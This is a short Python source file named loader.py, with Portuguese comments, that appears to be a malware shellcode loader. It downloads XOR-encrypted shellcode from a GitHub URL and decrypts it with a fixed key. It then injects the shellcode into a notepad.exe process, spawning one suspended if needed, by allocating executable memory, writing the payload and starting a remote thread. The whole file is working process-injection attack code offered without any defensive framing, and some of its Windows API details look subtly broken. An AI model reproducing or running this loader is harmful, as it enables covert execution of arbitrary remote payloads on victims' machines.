# loader.py
import sys
import ctypes
import requests
from ctypes import wintypes

# Configurações
SHELLCODE_URL = "https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/shellcode.bin"
XOR_KEY = 0x55  # mesma chave usada na criptografia
PROCESS_NAME = "notepad.exe"  # processo alvo

# ---------- Funções de injeção ----------
def xor_decrypt(data, key):
    return bytes([b ^ key for b in data])

def inject_shellcode(shellcode):
    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
    # Abre o processo alvo
    PROCESS_ALL_ACCESS = 0x1F0FFF
    pid = None
    import psutil
    for proc in psutil.process_iter(['name', 'pid']):
        if proc.info['name'].lower() == PROCESS_NAME.lower():
            pid = proc.info['pid']
            break
    if not pid:
        # Se não encontrou, cria um processo suspenso
        startupinfo = ctypes.create_string_buffer(68)
        ctypes.memset(startupinfo, 0, 68)
        ctypes.cast(startupinfo, ctypes.POINTER(wintypes.STARTUPINFO)).contents.cb = 68
        process_info = ctypes.create_string_buffer(16)
        kernel32.CreateProcessA(
            b"C:\\Windows\\System32\\notepad.exe", None, None, None,
            False, 0x4, None, None, ctypes.byref(startupinfo), ctypes.byref(process_info)
        )
        pid = int.from_bytes(process_info[8:12], 'little')
    
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    # Aloca memória no processo remoto
    MEM_COMMIT = 0x1000
    PAGE_EXECUTE_READWRITE = 0x40
    addr = kernel32.VirtualAllocEx(h_process, 0, len(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    # Escreve a shellcode
    written = ctypes.c_size_t(0)
    kernel32.WriteProcessMemory(h_process, addr, shellcode, len(shellcode), ctypes.byref(written))
    # Cria thread remota para executar
    kernel32.CreateRemoteThread(h_process, None, 0, addr, 0, 0, None)

# ---------- Main ----------
def main():
    # Baixa shellcode criptografada
    resp = requests.get(SHELLCODE_URL)
    enc_shellcode = resp.content
    # Descriptografa
    shellcode = xor_decrypt(enc_shellcode, XOR_KEY)
    # Injeta
    inject_shellcode(shellcode)

if __name__ == '__main__':
    main()
